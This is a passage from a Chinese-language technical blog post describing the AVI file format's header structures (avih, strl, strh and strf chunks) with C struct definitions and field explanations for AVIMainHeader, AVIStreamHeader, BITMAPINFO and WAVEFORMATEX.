List”</code></strong>是AVI文件的<code>文件头</code>，其中包含的数据是<code>有关视频的MetaData</code>(元数据)，例如其<code>宽度</code>、<code>高度</code>和<code>帧频</code>。<code>“hdrl List”</code>块包含<code>两种子块</code>，一种是<code>dwFourCC</code>为<code>“avih”</code>的<code>Chunk</code>，另一种是<code>dwFourCC</code>为<code>“strl”</code>的<code>List</code>。</p><h4 id="2-2-1、avih-Chunk-AVI-Header"><a href="#2-2-1、avih-Chunk-AVI-Header" class="headerlink" title="2.2.1、avih Chunk(AVI Header)"></a>2.2.1、avih Chunk(AVI Header)</h4><p>&emsp;&emsp;<strong><code>“avih”</code></strong>块用于存储AVI文件的<code>全局信息</code>，如：<code>流的数量</code>、视频的<code>宽度</code>和<code>高度</code>等。此结构定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwFourCC;     <span class="comment">// 必须为'avih'</span></span><br><span class="line">    DWORD dwSize;       <span class="comment">// 本数据结构的大小，不包括最初的8个字节(dwFourCC和dwSize两个字段)</span></span><br><span class="line">    BYTE data[dwSize];  <span class="comment">// AVIMainHeader struct</span></span><br><span class="line">&#125;CHUNK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>                </span><br><span class="line">    DWORD dwMicroSecPerFrame;       <span class="comment">// 每帧的持续时间(以毫秒ms为单位)，定义avi的显示速率</span></span><br><span class="line">    DWORD dwMaxBytesPerSec;         <span class="comment">// 最大的数据传输率</span></span><br><span class="line">    DWORD dwPaddingGranularity;     <span class="comment">// 数据填充的粒度</span></span><br><span class="line">    DWORD dwFlages;                 <span class="comment">// AVI文件的特殊属性，如是否包含索引块，音视频数据是否交叉存储</span></span><br><span class="line">    DWORD dwTotalFrame;             <span class="comment">// 文件中的总帧数</span></span><br><span class="line">    DWORD dwInitialFrames;          <span class="comment">// 说明在开始播放前需要多少桢</span></span><br><span class="line">    DWORD dwStreams;                <span class="comment">// 文件中包含的数据流个数</span></span><br><span class="line">    DWORD dwSuggestedBufferSize;    <span class="comment">// 建议使用的缓冲区的大小，</span></span><br><span class="line">                                    <span class="comment">// 通常为存储一桢图像以及同步声音所需要的数据之和</span></span><br><span class="line">    DWORD dwWidth;                  <span class="comment">// 图像宽</span></span><br><span class="line">    DWORD dwHeight;                 <span class="comment">// 图像高</span></span><br><span class="line">    DWORD dwReserved[<span class="number">4</span>];            <span class="comment">// 保留值</span></span><br><span class="line">&#125; AVIMainHeader;</span><br></pre></td></tr></table></figure></p><blockquote><ul><li><strong><code>dwFourCC</code></strong>: 标识此块为<code>“avih”</code>，用于存储<code>AVIMainHeader</code>结构体数据。</li><li><strong><code>dwSize</code></strong>: <code>AVIMainHeader</code>结构体的<code>字节数</code>。</li><li><strong><code>dwMicroSecPerFrame</code></strong>: 一个<code>视频帧</code>的<code>持续时间</code>(以<code>微秒</code>为单位)。可以<code>忽略</code>此值(请参阅Stream Header)，但任何AVI编写器均应正确写入该值。<ul><li><strong><code>重要说明</code></strong>：某些AVI修改软件，例如<code>AVIFrate</code>，会将<code>帧速率值</code>写入<code>Stream Header</code>，而不是<code>dwMicroSecPerFrame</code>。 因此，dwMicroSecPerFrame<code>不应该</code>被认为是<code>可靠的</code>！</li></ul></li><li><strong><code>dwMaxBytesPerSec</code></strong>: 指定文件的大致<code>最大数据速率</code>。这个值表示系统<code>每秒必须处理的字节数</code>，以显示AVI序列，该序列由<code>Main Header</code>和<code>Stream Header</code>块中包含的<code>其他参数</code>指定。该值也不重要。其可靠性不应被高估。</li><li><strong><code>dwPaddingGranularity</code></strong>: 指定数据<code>对齐方式</code>(以<code>字节</code>为单位)。将<code>数据</code>填充为<code>该值的倍数</code>。</li><li><strong><code>dwFlages</code></strong>: 见下文。</li><li><strong><code>dwTotalFrame</code></strong>: 指定文件中<code>数据帧的总数</code>。包含在<code>RIFF-AVI</code>列表中的<code>视频帧数</code>(如果存在<code>RIFF-AVIX-List</code>，则不应包含<code>整个文件</code>中的<code>帧总数</code>。某些声称<code>处理AVI文件的工具</code>甚至假定了这一点，但它显然违反了<code>Open-DML</code>文件格式规范。此类应用程序<code>已损坏</code>。)。由于某些AVI文件muxer在此处写入了错误的值，因此不应认为此值是可靠的。</li><li><strong><code>dwInitialFrames</code></strong>: 为<code>交错格式</code>指定<code>初始帧数</code>(<code>非交错格式</code>应该指定为<code>0</code>)。如果要创建<code>交错文件</code>，请在该成员中的AVI序列的<code>初始帧</code>之前指定文件中的<code>帧数</code>。要为<code>音频驱动程序</code>提供足够的音频以供使用，必须将<code>交错文件</code>中的<code>音频数据</code>相对于<code>视频数据</code>倾斜。通常，<code>音频数据</code>应<code>向前</code>移动足够的帧，以允许大约<code>0.75秒</code>的<code>音频数据</code>被<code>预加载</code>。<code>dwInitialRecords</code>成员应设置为<code>音频向前的帧数</code>。还要在<code>音频流头</code>中为<code>AVIStreamHeader</code>结构的<code>dwInitialFrames</code>成员设置相同的值。</li><li><strong><code>dwStreams</code></strong>: 文件中包含的<code>数据流个数</code>。例如，一个带有<code>音频</code>和<code>视频</code>的文件有<code>两个流</code>。</li><li><strong><code>dwSuggestedBufferSize</code></strong>: 指定用于<code>读取文件的建议缓冲区大小</code>。通常，此大小应足够大以包含文件中<code>最大的块</code>。如果设置为<code>零</code>，或者设置得<code>太小</code>，则播放软件将不得不在<code>播放过程</code>中<code>重新分配内存</code>，这会<code>降低性能</code>。对于<code>交错文件</code>，缓冲区大小应足够大以<code>读取整个记录</code>，而不仅仅是<code>块</code>。</li><li><strong><code>dwWidth</code></strong>: 视频流<code>宽度</code>。以<code>像素</code>为单位。</li><li><strong><code>dwHeight</code></strong>: 视频流<code>高度</code>。以<code>像素</code>为单位。</li><li><strong><code>dwReserved</code></strong>: <code>保留</code>。将这个数组设置为<code>0</code>。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>dwFlages</code></strong>中有效的<code>Flags</code>:</p><blockquote><ul><li><strong><code>AVIF_HASINDEX</code></strong>: 该文件<code>有索引</code>。</li><li><strong><code>AVIF_MUSTUSEINDEX</code></strong>: 指示应用程序应该使用<code>索引</code>，而不是文件中<code>块的物理顺序</code>，来确定<code>数据表示的顺序</code>。例如，这个标志可以用来创建一个<code>帧列表</code>来编辑。</li><li><strong><code>AVIF_ISINTERLEAVED</code></strong>: Stream适当的<code>相互交错。</code></li><li><strong><code>AVIF_WASCAPTUREFILE</code></strong>: 表示<code>AVI文件</code>是专门分配的用于<code>实时视频采集</code>的文件。应用程序在对设置了该标志的文件进行<code>写入之前</code>应该警告用户，因为用户可能会<code>对该文件进行整理</code>。</li><li><strong><code>AVIF_COPYRIGHTED</code></strong>: 表示AVI文件包含<code>有版权的数据和软件</code>。当使用这个标志时，软件不应该允许<code>复制数据</code>。</li><li><strong><code>AVIF_TRUSTCKTYPE</code></strong>(Open-DML only!): 该标志表示<code>索引</code>中的<code>关键帧标志</code>(AVIIF_KEYFRAME)是可靠的。如果未在<code>Open-DML</code>文件中设置此标志，则<code>关键帧标志</code>可能存在<code>缺陷</code>，而不会从<code>技术上</code>使文件无效。</li></ul></blockquote><h4 id="2-2-2、strl-List-Stream-Header-List"><a href="#2-2-2、strl-List-Stream-Header-List" class="headerlink" title="2.2.2、strl List(Stream Header List)"></a>2.2.2、strl List(Stream Header List)</h4><p>&emsp;&emsp;<strong><code>“strl List”</code></strong>用于存储AVI文件中的<code>数据流</code>(<code>音频流</code>、<code>视频流</code>、<code>字幕流</code>)的相关信息。在<code>“hdrl List”</code>中的<code>“avih Chunk”</code>之后，有一个或多个<code>“strl List”</code>。</p><blockquote><ul><li>1、AVI文件中有多少个<code>数据流</code>(视频流、音频流、字幕流)，这里就对应有多少个<code>“strl List”</code>。每个<code>“strl List”</code>都包含AVI文件中<code>一个数据流</code>的相关信息。</li><li>2、每个<code>“strl List”</code>中至少包含一个<code>“strh Chunk”</code>和一个<code>“strf Chunk”</code>。</li><li>3、<code>“strd Chunk”</code>和<code>“strn Chunk”</code>是可选的。</li><li>4、根据<code>“strl List”</code>在<code>“hdrl List”</code>中的顺序，<code>“hdrl List”</code>中的<code>Stream Header</code>与<code>“movi List”</code>中的<code>Stream Data</code>是一一对应的。第一个<code>“strl List”</code>应用于<code>Stream 0</code>，第二个<code>“strl List”</code>应用于<code>Stream 1</code>，以此类推。</li></ul></blockquote><h5 id="2-2-2-1、strh-Chunk-Stream-Header"><a href="#2-2-2-1、strh-Chunk-Stream-Header" class="headerlink" title="2.2.2.1、strh Chunk(Stream Header)"></a>2.2.2.1、strh Chunk(Stream Header)</h5><p>&emsp;&emsp;<strong><code>“strh Chunk”</code></strong>用于描述<code>“strl List”</code>对应的<code>数据流</code>的相关信息。此<code>Chunk</code>中的<code>data</code>中存储的是<strong><code>AVIStreamHeader</code></strong>结构体数据，其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwFourCC;     <span class="comment">// 必须为'strh'</span></span><br><span class="line">    DWORD dwSize;       <span class="comment">// 本数据结构的大小，不包括最初的8个字节(dwFourCC和dwSize两个字段)</span></span><br><span class="line">    BYTE data[dwSize];  <span class="comment">// AVIStreamHeader struct</span></span><br><span class="line">&#125;CHUNK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    FOURCC fccType;                 <span class="comment">// 4字节，表示数据流的种类，vids表示视频数据流，auds表示音频数据流</span></span><br><span class="line">    FOURCC fccHandler;              <span class="comment">// 4字节 ，表示数据流解压缩的驱动程序代号</span></span><br><span class="line">    DWORD dwFlags;                  <span class="comment">// 数据流属性</span></span><br><span class="line">    WORD wPriority;                 <span class="comment">// 此数据流的播放优先级</span></span><br><span class="line">    WORD wLanguage;                 <span class="comment">// 音频的语言代号</span></span><br><span class="line">    DWORD dwInitalFrames;           <span class="comment">// 说明在开始播放前需要多少桢</span></span><br><span class="line">    DWORD dwScale;                  <span class="comment">// 数据量，视频每桢的大小或者音频的采样大小</span></span><br><span class="line">    DWORD dwRate;                   <span class="comment">// dwScale/dwRate = 每秒的采样数</span></span><br><span class="line">    DWORD dwStart;                  <span class="comment">// 数据流开始播放的位置，以dwScale为单位</span></span><br><span class="line">    DWORD dwLength;                 <span class="comment">// 数据流的数据量，以dwScale为单位</span></span><br><span class="line">    DWORD dwSuggestedBufferSize;    <span class="comment">// 建议缓冲区的大小</span></span><br><span class="line">    DWORD dwQuality;                <span class="comment">// 解压缩质量参数，值越大，质量越好</span></span><br><span class="line">    DWORD dwSampleSize;             <span class="comment">// 音频的采样大小</span></span><br><span class="line">    RECT rcFrame;                   <span class="comment">// 视频图像所占的矩形</span></span><br><span class="line">&#125;AVIStreamHeader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> left;     </span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> top;</span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> right;</span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> bottom;</span><br><span class="line">&#125;RECT;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>dwFourCC</code></strong>: 标识此块为<code>“strh”</code>，用于存储<code>AVIStreamHeader</code>结构体数据。</li><li><strong><code>dwSize</code></strong>: <code>AVIStreamHeader</code>结构体的<code>字节数</code>。</li><li><strong><code>fccType</code></strong>: 表示<code>数据流的种类</code>，<code>“vids”</code>(视频流)、<code>“auds”</code>(音频流)、<code>“mids”</code>(MIDI流)、<code>“txts”</code>(字幕流)。</li><li><strong><code>fccHandler</code></strong>: 要使用的<code>编解码器</code>的<code>FourCC</code>。</li><li><strong><code>dwFlags</code></strong>: 数据流<code>属性</code>，定义了以下标志：<ul><li><strong><code>AVISF_DISABLED</code></strong>: 默认情况下<code>不应激活</code>此数据流。</li><li><strong><code>AVISF_VIDEO_PALCHANGES</code></strong>: Stream是使用<code>调色板</code>的<code>视频流</code>，其中在<code>播放过程</code>中<code>调色板</code>会发生变化。</li></ul></li><li><strong><code>wPriority</code></strong>: 此数据流的<code>播放优先级</code>，当有多个<code>相同类型的流</code>时<code>优先级最高</code>的为<code>默认流</code>。</li><li><strong><code>wLanguage</code></strong>: 音频的<code>语言代号</code>。</li><li><strong><code>dwInitalFrames</code></strong>: 指定<code>交错文件</code>中<code>音频数据</code>在<code>视频帧</code>之前的<code>偏移量</code>。通常，这是大约<code>0.75秒</code>。如果要创建<code>交错文件</code>，请在该成员的AVI序列的<code>初始帧</code>之前指定<code>文件中的帧数</code>。有关更多信息，请参见<code>AVIMainHeader</code>结构的<code>dwInitialFrames</code>成员的备注。</li><li><strong><code>dwScale</code></strong>: <code>数据量</code>，<code>视频</code>的<code>每桢的大小</code>或者<code>音频</code>的<code>采样大小</code>。与<code>dwRate</code>一起使用以指定<code>此流</code>将使用的<code>时间尺度</code>。将<code>dwRate</code>除以<code>dwScale</code>可得出<code>每秒的采样数</code>。对于<code>视频流</code>，这是<code>帧速率</code>。对于<code>音频流</code>，此速率对应于播放音频的<code>nBlockAlign字节</code>所需的<code>时间</code>，而对于<code>PCM音频</code>，这只是<code>采样速率</code>。dwScale和dwRate应该<code>互质</code>。测试表明，例如<code>10000000/400000</code>代替<code>25/1</code>会导致文件在某些<code>硬件MPEG4播放器</code>上不起作用。</li><li><strong><code>dwRate</code></strong>: 参考dwScale。</li><li><strong><code>dwStart</code></strong>: 指定此流的<code>开始时间</code>。单位由<code>AVIStreamHeader</code>中的<code>dwRate</code>和<code>dwScale</code>成员定义。通常，它是<code>0</code>，但是它可以为<code>不与文件同时启动的流</code>指定<code>延迟时间</code>。对于<code>VBR音频</code>，此值指示在流<code>开始之前</code>要播放的<code>无声帧数</code>。</li><li><strong><code>dwLength</code></strong>: 指定<code>流的长度</code>，以<code>dwRate</code>和<code>dwScale</code>定义的单位为单位。</li><li><strong><code>dwSuggestedBufferSize</code></strong>: 指定应使用<code>多大的缓冲区</code>来<code>读取此流</code>。通常，它包含一个与流中存在的<code>最大块</code>相对应的值。使用<code>正确的缓冲区大小</code>可使<code>播放效率更高</code>。如果您不知道<code>正确的缓冲区大小</code>，请使用<code>零</code>。<code>可以</code>为0(在这种情况下，应用程序必须<code>猜测</code>)，但<code>不应该</code>为0，因为<code>Microsoft</code>的<code>AVI解析器</code>在某些情况下<code>无法正确处理</code>此情况(例如，<code>Open-DML</code>文件中的<code>MP3-CBR</code>)。</li><li><strong><code>dwQuality</code></strong>: 指定流中<code>数据质量</code>的指示符。质量表示为<code>0到10000</code>之间的数字。对于<code>压缩数据</code>，这通常表示传递给压缩软件的<code>质量参数</code>的值。如果设置为<code>–1</code>，驱动程序将使用<code>默认质量值</code>。</li><li><strong><code>dwSampleSize</code></strong>: 指定<code>单个数据样本的大小</code>。如果<code>样本大小不同</code>，则将其设置为<code>0</code>。如果该数字<code>不为0</code>，则可以将<code>多个数据样本</code>分组到文件内的<code>单个块</code>中。如果为<code>0</code>，则<code>每个数据样本</code>(例如<code>视频帧</code>)必须位于<code>单独的块</code>中。对于<code>视频流</code>，此数字<code>通常为0</code>，但如果所有视频帧的<code>大小相同</code>，则可以为<code>非0</code>。对于<code>音频流</code>，此数字应与描述音频的<code>WAVEFORMATEX</code>结构的<code>nBlockAlign</code>成员相同。</li><li><strong><code>rcFrame</code></strong>: 指定由<code>AVIMainHeader</code>结构的<code>dwWidth</code>和<code>dwHeight</code>成员指定的<code>影片矩形</code>内的<code>字幕</code>或<code>视频</code>流的<code>目标矩形</code>。<code>rcFrame</code>成员通常用于支持<code>多个视频流</code>。将此矩形设置为与<code>影片矩形</code>对应的坐标，以更新<code>整个影片矩形</code>。该成员的单位是<code>像素</code>。<code>目标矩形</code>的左上角相对于<code>影片矩形</code>的左上角。</li></ul></blockquote><p>&emsp;&emsp;该结构的某些成员也存在于<code>AVIMainHeader</code>结构中。<code>AVIMainHeader</code>结构中的数据应用于<code>整个文件</code>，而<code>AVIStreamHeader</code>结构中的数据应用于<code>一个流</code>。</p><h5 id="2-2-2-2、strf-Chunk-Stream-Format"><a href="#2-2-2-2、strf-Chunk-Stream-Format" class="headerlink" title="2.2.2.2、strf Chunk(Stream Format)"></a>2.2.2.2、strf Chunk(Stream Format)</h5><p>&emsp;&emsp;<strong><code>“strf Chunk”</code></strong>紧跟在<code>“strh Chunk”</code>之后，其描述了数据流中<code>数据的格式</code>。此<code>Chunk</code>中包含的数据取决于<code>数据流的类型</code>。对于<strong><code>视频流</code></strong>，该信息是<strong><code>BITMAPINFO</code></strong>结构，包括适当的<code>调色板</code>信息。对于<strong><code>音频流</code></strong>，该信息是<strong><code>WAVEFORMATEX</code></strong>结构。</p><h6 id="视频流-BITMAPINFO"><a href="#视频流-BITMAPINFO" class="headerlink" title="视频流(BITMAPINFO)"></a>视频流(BITMAPINFO)</h6><p>&emsp;&emsp;<strong><code>BITMAPINFO</code></strong>结构定义了一个<code>DIB</code>(Device-Independent Bitmap:设备无关位图)的<code>尺寸</code>和<code>颜色</code>信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwFourCC;     <span class="comment">// 必须为'strf'</span></span><br><span class="line">    DWORD dwSize;       <span class="comment">// 本数据结构的大小，不包括最初的8个字节(dwFourCC和dwSize两个字段)</span></span><br><span class="line">    BYTE data[dwSize];  <span class="comment">// BITMAPINFO struct</span></span><br><span class="line">&#125;CHUNK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 位图信息</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFO</span> &#123;</span></span><br><span class="line">    BITMAPINFOHEADER bmiHeader;</span><br><span class="line">    RGBQUAD          bmiColors[<span class="number">1</span>];</span><br><span class="line">&#125; BITMAPINFO;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 位图信息头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">    DWORD biSize;</span><br><span class="line">    LONG  biWidth;</span><br><span class="line">    LONG  biHeight;</span><br><span class="line">    WORD  biPlanes;</span><br><span class="line">    WORD  biBitCount;</span><br><span class="line">    DWORD biCompression;</span><br><span class="line">    DWORD biSizeImage;</span><br><span class="line">    LONG  biXPelsPerMeter;</span><br><span class="line">    LONG  biYPelsPerMeter;</span><br><span class="line">    DWORD biClrUsed;</span><br><span class="line">    DWORD biClrImportant;</span><br><span class="line">&#125; BITMAPINFOHEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">    BYTE rgbBlue;</span><br><span class="line">    BYTE rgbGreen;</span><br><span class="line">    BYTE rgbRed;</span><br><span class="line">    BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><code>dwFourCC</code></strong>: 标识此块为<code>“strf”</code>，用于存储<code>BITMAPINFO</code>结构体数据。</li><li><strong><code>dwSize</code></strong>: <code>BITMAPINFO</code>结构体的<code>字节数</code>。</li><li><strong><code>bmiHeader</code></strong>: 一个<code>BITMAPINFOHEADER</code>结构，包含关于DIB的<code>尺寸</code>和<code>颜色格式</code>的信息。</li><li><strong><code>bmiColors</code></strong>: bmiColors成员包含以下之一:<ul><li><code>RGBQUAD</code>的数组。数组元素组成了<code>颜色表</code>。</li><li>一个16位<code>无符号整数数组</code>，用于指定当前实现的<code>逻辑调色板</code>中的<code>索引</code>。对于使用<code>DIB</code>的<code>函数</code>，可以使用<code>bmiColors</code>。数组中的<code>条目数</code>取决于<code>BITMAPINFOHEADER</code>结构的<code>biBitCount</code>和<code>biClrUsed</code>成员的值。<code>bmiColors</code>表中的颜色按<code>重要性</code>顺序显示。</li></ul></li></ul></blockquote><p>&emsp;&emsp;<code>DIB</code>(Device-Independent Bitmap:设备无关位图)由<code>两个不同的部分</code>组成：描述位图的<code>尺寸</code>和<code>颜色</code>的<code>BITMAPINFO</code>结构体，以及定义位图<code>像素</code>的<code>字节数组</code>。<code>数组中的位</code>打包在一起，但是<code>每条扫描线</code>必须用<code>0</code>填充，以在<code>LONG数据类型边界</code>上结束。如果位图的<code>高度为正</code>，则位图为<code>自下而上的DIB</code>，其原点为<code>左下角</code>。如果<code>高度为负</code>，则位图为<code>自上而下的DIB</code>，其原点为<code>左上角</code>。</p><p>&emsp;&emsp;当<code>位图数组</code>紧跟在<code>BITMAPINFO</code>头之后时，位图<code>被压缩</code>。压缩的位图由<code>单个指针</code>引用。对于<code>压缩位图</code>，在使用<code>DIB_PAL_COLORS</code>模式时，必须将<code>biClrUsed</code>成员设置为<code>偶数</code>，以使<code>DIB位图数组</code>从<code>DWORD边界</code>开始(对齐)。</p><p>&emsp;&emsp;<strong><code>BITMAPINFOHEADER</code></strong>结构体包含了<code>设备无关位图(DIB)</code>的<code>尺寸</code>和<code>颜色格式</code>的信息。</p><blockquote><ul><li><strong><code>biSize</code></strong>: 指定此结构所需的<code>字节数</code>。如果它们被附加到<code>此结构的末尾</code>，则此值不包括<code>颜色表</code>的大小或<code>颜色掩码</code>的大小。</li><li><strong><code>biWidth</code></strong>: 指定位图的<code>宽度</code>，以<code>像素</code>为单位。</li><li><strong><code>biHeight</code></strong>: 指定位图的<code>高度</code>，以<code>像素</code>为单位。<ul><li>对于<code>未压缩</code>的<code>RGB</code>位图，如果<code>biHeight为正</code>，则该位图是<code>自下而上的DIB</code>，其原点位于<code>左下角</code>。如果<code>biHeight为负</code>，则位图是<code>自上而下的DIB</code>，其原点位于<code>左上角</code>。</li><li>对于<code>YUV</code>位图，无论<code>biHeight</code>的符号如何，位图始终是<code>自顶向下</code>的。<code>解码器</code>应提供具有<code>正biHeight</code>的<code>YUV</code>格式，但为了<code>向后兼容</code>，它们应接受具有<code>正或负biHeight</code>的<code>YUV</code>格式。</li><li>对于<code>压缩</code>格式，<code>biHeight</code>必须为<code>正</code>，无论<code>图像方向</code>如何。</li></ul></li><li><strong><code>biPlanes</code></strong>: 指定<code>目标设备</code>的<code>平面数</code>。此值必须<code>设置为1</code>。</li><li><strong><code>biBitCount</code></strong>: 指定<code>每个像素的位数</code>(bits per pixel:<code>bpp</code>)。对于<code>未压缩</code>格式，此值为<code>每个像素的平均位数</code>。对于<code>压缩</code>格式，此值是在解码图像后<code>未压缩图像</code>的<code>隐含位深度</code>。</li><li><strong><code>biCompression</code></strong>: <ul><li>对于<code>压缩视频</code>和<code>YUV</code>格式，此成员是<code>FourCC</code>代码，指定为以<code>小端序</code>排列的<code>DWORD</code>。例如，<code>YUYV</code>视频的<code>FourCC</code>为<code>“VYUY”</code>或<code>0x56595559</code>。</li><li>对于<code>未压缩</code>的<code>RGB</code>格式，可以使用以下值：<code>BI_RGB</code>(未压缩的RGB)、<code>BI_BITFIELDS</code>(带颜色掩码的未压缩RGB。适用于16位和32位的位图。)</li><li>对于<code>16-bpp</code>位图，如果<code>biCompression</code>等于<code>BI_RGB</code>，则格式始终为<code>RGB555</code>。如果<code>biCompression</code>等于<code>BI_BITFIELDS</code>，则格式为<code>RGB555</code>或<code>RGB565</code>。使用<code>AM_MEDIA_TYPE</code>结构中的<code>子类型GUID</code>确定特定的<code>RGB类型</code>。</li></ul></li><li><strong><code>biSizeImage</code></strong>: 指定<code>图像的大小</code>(以<code>字节</code>为单位)。对于<code>未压缩</code>的<code>RGB位图</code>，可以将其<code>设置为0</code>。</li><li><strong><code>biXPelsPerMeter</code></strong>: 指定位图目标设备的<code>水平分辨率</code>(以<code>像素每米</code>为单位)。</li><li><strong><code>biYPelsPerMeter</code></strong>: 指定位图目标设备的<code>垂直分辨率</code>(以<code>像素每米</code>为单位)。</li><li><strong><code>biClrUsed</code></strong>: 指定<code>颜色表</code>中位图实际使用的<code>颜色索引数</code>。</li><li><strong><code>biClrImportant</code></strong>: 指定被认为对显示位图<code>很重要</code>的<code>颜色索引数</code>。如果该值为<code>零</code>，则所有颜色<code>都很重要</code>。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>RGBQUAD</code></strong>结构体成员含义：</p><blockquote><ul><li><strong><code>rgbBlue</code></strong>: 颜色中<code>蓝色</code>的强烈程度。</li><li><strong><code>rgbGreen</code></strong>: 颜色中<code>绿色</code>的强烈程度。</li><li><strong><code>rgbRed</code></strong>: 颜色中<code>红色</code>的强烈程度。</li><li><strong><code>rgbReserved</code></strong>: 该成员是<code>保留</code>的，并且<code>必须为零</code>。</li></ul></blockquote><h6 id="音频流-WAVEFORMATEX"><a href="#音频流-WAVEFORMATEX" class="headerlink" title="音频流(WAVEFORMATEX)"></a>音频流(WAVEFORMATEX)</h6><p>&emsp;&emsp;<strong><code>WAVEFORMATEX</code></strong>结构定义了<code>波形音频数据</code>的格式。 该结构仅包括所有<code>波形音频数据</code>格式<code>共有的</code>格式信息。 对于需要<code>附加信息</code>的格式，此结构作为<code>附加信息</code>包括在<code>另一个结构</code>中作为<code>第一个成员</code>。</p><p>&emsp;&emsp;支持<code>两个以上通道</code>或<code>超过16位的样本大小</code>(更高的采样分辨率)的格式可以用<code>WAVEFORMATEXTENSIBLE</code>结构来描述，该结构包括<code>WAVEFORMATEX</code>结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwFourCC;     <span class="comment">// 必须为'strf'</span></span><br><span class="line">    DWORD dwSize;       <span class="comment">// 本数据结构的大小，不包括最初的8个字节(dwFourCC和dwSize两个字段)</span></span><br><span class="line">    BYTE data[dwSize];  <span class="comment">// WAVEFORMATEX struct或WAVEFORMATEXTENSIBLE struct</span></span><br><span class="line">&#125; CHUNK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tWAVEFORMATEX</span> &#123;</span></span><br><span class="line">    WORD  wFormatTag;</span><br><span class="line">    WORD  nChannels;</span><br><span class="line">    DWORD nSamplesPerSec;</span><br><span class="line">    DWORD nAvgBytesPerSec;</span><br><span class="line">    WORD  nBlockAlign;</span><br><span class="line">    WORD  wBitsPerSample;</span><br><span class="line">    WORD  cbSize;</span><br><span class="line">&#125; WAVEFORMATEX;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    WAVEFORMATEX Format;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        WORD wValidBitsPerSample;</span><br><span class="line">        WORD wSamplesPerBlock;</span><br><span class="line">        WORD wReserved;</span><br><span class="line">    &#125; Samples;</span><br><span class="line">    DWORD  dwChannelMask;</span><br><span class="line">    GUID   SubFormat;</span><br><span class="line">&#125; 